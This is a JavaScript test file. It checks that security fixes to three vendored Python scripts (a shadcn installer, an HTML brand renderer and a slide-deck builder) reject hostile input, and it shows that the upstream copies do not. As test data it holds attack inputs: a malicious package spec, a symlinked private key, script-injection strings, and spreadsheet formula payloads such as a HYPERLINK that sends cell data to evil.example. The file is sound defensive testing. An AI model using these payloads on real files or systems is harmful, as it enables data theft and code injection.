// Muster's security adaptations of three vendored scripts (vendor/manifest.yaml sources uupm and
// intent; each change is noted in the file header, base copies under vendor/upstream/). Each
// test also runs the upstream base copy as a kill check. Skipped without python3.
//   uupm-ui-styling shadcn_add.py   package.json's shadcn spec chose what `npx` installed and ran;
//                                   component arguments could be registry URLs or flags.
//   uupm-design cip/render-html.py  symlinked *.png files were base64-embedded into the page;
//                                   brand/file-derived text reached the HTML unescaped.
//   intent-present build_deck.py    chart labels became workbook formulas and hyperlinks.
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdirSync, writeFileSync, readFileSync, symlinkSync, rmSync, readdirSync } from "node:fs";
import { trackedMkdtempSync as mkdtempSync } from "../test-support/helpers.js";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";

const repo = fileURLToPath(new URL("../", import.meta.url));
const skip = spawnSync("python3", ["--version"]).error ? "python3 not available" : false;

function py(code, args = []) {
  const run = spawnSync("python3", ["-I", "-B", "-c", code, ...args], {
    encoding: "utf8",
    env: { PATH: process.env.PATH, PYTHONDONTWRITEBYTECODE: "1" },
  });
  if (run.status !== 0) throw new Error(`python failed: ${run.stderr}`);
  return run.stdout.trim();
}

const SHADCN = {
  muster: join(repo, "plugin/builtins/uupm-ui-styling/scripts/shadcn_add.py"),
  upstream: join(repo, "vendor/upstream/uupm/.claude/skills/ui-styling/scripts/shadcn_add.py"),
};

function shadcnProbe(script, project, components) {
  return JSON.parse(py(`import json, runpy, sys
from pathlib import Path
m = runpy.run_path(sys.argv[1])
inst = m["ShadcnInstaller"](project_root=Path(sys.argv[2]), dry_run=True)
ok, msg = inst.add_components(json.loads(sys.argv[3]))
print(json.dumps({"version": inst._get_shadcn_version(), "ok": ok, "msg": msg}))`, [script, project, JSON.stringify(components)]));
}

test("shadcn_add.py runs only a plain-semver shadcn and plain component names", { skip }, () => {
  const project = mkdtempSync(join(tmpdir(), "muster-shadcn-"));
  try {
    writeFileSync(join(project, "components.json"), JSON.stringify({ aliases: { components: "@/components" } }));
    writeFileSync(join(project, "package.json"), JSON.stringify({ devDependencies: { shadcn: "github:attacker/shadcn" } }));
    const hostile = shadcnProbe(SHADCN.muster, project, ["button"]);
    assert.equal(hostile.version, "2.3.0", "a non-semver spec from package.json falls back to the pin");
    assert.equal(hostile.msg, "Would run: npx shadcn@2.3.0 add button");
    for (const bad of [["https://evil.example/r/button.json"], ["--cwd=/home/user/other"], ["../x"], ["button", "-y"]]) {
      const result = shadcnProbe(SHADCN.muster, project, bad);
      assert.equal(result.ok, false, `${JSON.stringify(bad)} must be refused`);
      assert.match(result.msg, /Invalid component name/);
    }
    writeFileSync(join(project, "package.json"), JSON.stringify({ dependencies: { shadcn: "^2.5.0" } }));
    assert.equal(shadcnProbe(SHADCN.muster, project, ["dropdown-menu"]).msg, "Would run: npx shadcn@2.5.0 add dropdown-menu");

    writeFileSync(join(project, "package.json"), JSON.stringify({ devDependencies: { shadcn: "github:attacker/shadcn" } }));
    const upstream = shadcnProbe(SHADCN.upstream, project, ["https://evil.example/r/button.json"]);
    assert.equal(upstream.version, "github:attacker/shadcn", "kill check: upstream lets package.json choose the package npx runs");
    assert.equal(upstream.ok, true, "kill check: upstream passes a registry URL through");
  } finally {
    rmSync(project, { recursive: true, force: true });
  }
});

const CIP = {
  muster: join(repo, "plugin/builtins/uupm-design/scripts/cip/render-html.py"),
  upstream: join(repo, "vendor/upstream/uupm/.claude/skills/design/scripts/cip/render-html.py"),
};
// A 1x1 PNG.
const PNG = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==", "base64");

function renderCip(script, images, out) {
  // The base copy imports core.py from its own directory, which only the builtin has.
  return py(`import runpy, sys
sys.path.insert(0, sys.argv[4])
m = runpy.run_path(sys.argv[1])
print(m["generate_html"]('Acme <script>alert(1)</script>', "technology", sys.argv[2], sys.argv[3]))`,
  [script, images, out, join(repo, "plugin/builtins/uupm-design/scripts/cip")]);
}

test("cip render-html.py never embeds a symlinked image and escapes every interpolated value", { skip }, () => {
  const dir = mkdtempSync(join(tmpdir(), "muster-cip-"));
  try {
    const secret = join(dir, "id_rsa");
    writeFileSync(secret, "-----BEGIN MUSTER TEST KEY-----\n");
    const images = join(dir, "brand-assets");
    mkdirSync(images);
    writeFileSync(join(images, "business-card.png"), PNG);
    writeFileSync(join(images, 'x" onerror="alert(1)" y.png'), PNG);
    symlinkSync(secret, join(images, "a.png"));
    const out = join(dir, "out.html");
    renderCip(CIP.muster, images, out);
    const page = readFileSync(out, "utf8");
    const leaked = Buffer.from("-----BEGIN MUSTER TEST KEY-----\n").toString("base64");
    assert.ok(!page.includes(leaked), "the symlinked file's bytes are not embedded");
    assert.doesNotMatch(page, /<script>alert/, "the brand name is escaped");
    assert.doesNotMatch(page, /" onerror="/i, "a file-derived title cannot break out of its attribute");
    assert.equal((page.match(/data:image\/png;base64,/g) || []).length, 2, "the two regular images are still embedded");

    const upstreamOut = join(dir, "upstream.html");
    renderCip(CIP.upstream, images, upstreamOut);
    const upstreamPage = readFileSync(upstreamOut, "utf8");
    assert.ok(upstreamPage.includes(leaked) || /<script>alert/.test(upstreamPage), "kill check: upstream embeds the symlink or the raw brand");

    symlinkSync(secret, join(dir, "planted.html"));
    assert.match(renderCip(CIP.muster, images, join(dir, "planted.html")), /None/, "a symlinked output path is refused");
    assert.equal(readFileSync(secret, "utf8"), "-----BEGIN MUSTER TEST KEY-----\n");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

const DECK = {
  muster: join(repo, "plugin/builtins/intent-present/references/build_deck.py"),
  upstream: join(repo, "vendor/upstream/intent/skills/present/references/build_deck.py"),
};

// Labels the chart workbook must keep as literal text: XlsxWriter's write() turns "=..." into a
// formula, "{=...}" into an array formula even with strings_to_formulas off, and
// http(s)/ftp/mailto/internal/external strings into hyperlinks or external references.
const HOSTILE_LABELS = [
  '=HYPERLINK("https://evil.example/?"&B2,"x")', '{=HYPERLINK("http://evil","x")}', "{=1+1}",
  "http://evil.example", "mailto:x@evil.example", "external:x", "+cmd", "-cmd", "@SUM(1)", "\tx", "\rx",
];

const PPTX_STUB = `import sys, types
class Any:
    def __init__(self, *a, **k): pass
    def __call__(self, *a, **k): return Any()
    def __getattr__(self, name): return Any()
for name in ["pptx", "pptx.util", "pptx.enum", "pptx.enum.text", "pptx.dml", "pptx.dml.color", "pptx.chart", "pptx.chart.data", "pptx.enum.chart", "pptx.enum.shapes", "pptx.chart.xlsx"]:
    mod = types.ModuleType(name)
    mod.__getattr__ = lambda attr: Any()
    sys.modules[name] = mod
    if "." in name:
        parent, _, child = name.rpartition(".")
        setattr(sys.modules[parent], child, mod)
sys.modules["pptx.util"].Emu = int
`;

// build_deck.py imports python-pptx at load time; stub it so validation and the workbook wrapper
// are checked everywhere python3 exists, not only where python-pptx is installed.
function deckValidate(script, labels) {
  const spec = { slides: [{ layout: "claim_chart", title: "Growth", alt: "bar chart", chart: { type: "bar", categories: labels, series: [{ name: "Revenue", values: labels.map(() => 1) }] } }] };
  return py(`${PPTX_STUB}
import json, runpy
m = runpy.run_path(sys.argv[1])
try:
    m["_validate"](json.loads(sys.argv[2]))
    print("accepted")
except ValueError as e:
    print("rejected")`, [script, JSON.stringify(spec)]);
}

test("build_deck.py rejects chart labels with a formula or link trigger prefix", { skip }, () => {
  for (const label of [...HOSTILE_LABELS, " =1+1", "HTTPS://evil.example", "ftp://x", "internal:Sheet2!A1"]) {
    assert.equal(deckValidate(DECK.muster, [label, "Q2"]), "rejected", `${JSON.stringify(label)} must be rejected`);
  }
  for (const label of ["Q1", "Revenue (USD)", "Growth: 5%", "2024"]) assert.equal(deckValidate(DECK.muster, [label, "Q2"]), "accepted", label);
  assert.equal(deckValidate(DECK.upstream, ['=HYPERLINK("https://evil.example/?"&B2,"x")', "Q2"]), "accepted", "kill check: upstream accepts a formula label");
});

test("build_deck.py makes python-pptx write chart strings with write_string and conversion off", { skip }, () => {
  const out = py(`${PPTX_STUB}
import json, runpy
calls = []
class Sheet:
    def write(self, *a): calls.append(["write", list(a)])
    def write_string(self, *a): calls.append(["write_string", list(a)])
class Book:
    def __init__(self, f, opts=None): calls.append(["options", opts])
    def add_worksheet(self, *a, **k): return Sheet()
sys.modules["pptx.chart.xlsx"].Workbook = Book
runpy.run_path(sys.argv[1])
sheet = sys.modules["pptx.chart.xlsx"].Workbook("blob", {"in_memory": True}).add_worksheet()
sheet.write(0, 0, "{=1+1}", None)
sheet.write(1, 0, 3.5)
print(json.dumps(calls))`, [DECK.muster]);
  assert.deepEqual(JSON.parse(out), [
    ["options", { in_memory: true, strings_to_formulas: false, strings_to_urls: false }],
    ["write_string", [0, 0, "{=1+1}", null]],
    ["write", [1, 0, 3.5]],
  ]);
});

// End to end with the real python-pptx/XlsxWriter when they are installed: load build_deck.py (which
// installs the workbook wrapper), let python-pptx write the chart workbook for every hostile label
// (bypassing _validate, so the workbook layer is tested on its own), and read the sheet XML.
// No -I here: python-pptx is often a user-site install; -c never puts the working directory first
// when the code does not import from it, and cwd is a fresh directory.
const hasPptx = !skip && spawnSync("python3", ["-B", "-c", "import pptx"]).status === 0;
function chartWorkbook(script, labels) {
  const dir = mkdtempSync(join(tmpdir(), "muster-deck-"));
  try {
    const run = spawnSync("python3", ["-B", "-c", `import io, json, re, runpy, sys, zipfile
runpy.run_path(sys.argv[1])
from pptx.chart.data import CategoryChartData
labels = json.loads(sys.argv[2])
data = CategoryChartData(); data.categories = labels
data.add_series(labels[0], [1] * len(labels))
x = zipfile.ZipFile(io.BytesIO(data.xlsx_blob))
names = x.namelist()
sheet = x.read("xl/worksheets/sheet1.xml").decode()
shared = x.read("xl/sharedStrings.xml").decode() if "xl/sharedStrings.xml" in names else ""
print(json.dumps({"formulas": re.findall(r"<f\\b[^>]*>[^<]*</f>", sheet), "hyperlinks": len(re.findall(r"<hyperlink\\b", sheet)),
  "rels": [n for n in names if "worksheets/_rels" in n], "shared": shared}))`, script, JSON.stringify(labels)], { encoding: "utf8", cwd: dir });
    if (run.status !== 0) throw new Error(run.stderr);
    return JSON.parse(run.stdout.trim());
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

test("build_deck.py's chart workbook holds no formula or hyperlink for any hostile label", { skip: hasPptx ? false : "python-pptx not installed" }, () => {
  const book = chartWorkbook(DECK.muster, HOSTILE_LABELS);
  assert.deepEqual(book.formulas, [], "no <f> formula element for any hostile label");
  assert.equal(book.hyperlinks, 0, "no label became a hyperlink");
  assert.deepEqual(book.rels, [], "no external relationship");
  for (const label of ["HYPERLINK", "{=1+1}", "http://evil.example", "mailto:x@evil.example", "external:x", "+cmd", "@SUM(1)"]) {
    assert.ok(book.shared.includes(label), `${label} is kept as a string`);
  }
  // Kill check (external:x is left out: upstream's URL parser crashes on it).
  const upstream = chartWorkbook(DECK.upstream, HOSTILE_LABELS.filter((l) => !l.startsWith("external:")));
  assert.ok(upstream.formulas.length >= 3 && upstream.hyperlinks > 0, `kill check: upstream writes formulas and hyperlinks (${JSON.stringify(upstream.formulas)})`);
});
